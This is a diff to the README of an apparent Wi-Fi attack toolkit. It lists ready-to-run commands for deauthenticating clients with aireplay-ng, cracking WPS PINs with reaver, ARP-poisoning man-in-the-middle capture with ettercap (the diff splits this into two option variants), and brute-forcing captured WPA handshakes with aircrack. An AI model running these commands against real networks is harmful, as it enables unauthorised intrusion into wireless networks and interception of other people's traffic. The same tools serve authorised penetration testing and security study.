@@ -83,9 +83,11 @@ aireplay-ng -0 $deauthvar -a $bssidvar wlan0mon
 
 reaver -i wlan0mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog/wpscrack/$filevar.log
 
-4. 'MITM-Ettercap' will intiate a MITM by Ettercap. The command line used is as follows:
+4. 'MITM-Ettercap' will intiate a MITM by Ettercap. The command line used is as follows (two options):
 
-ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+ettercap -T -i $intervar -M arp:remote -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+
+ettercap -T -i $intervar -M ARP -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 
 5. 'AIRCRACK' will brute force the WPA key captured in any PCAPs acquired from a target AP. All four EAPOLs from an AP and client from a single authentication and a very good wordlist will be required for this to work. Command line is as follows:
 
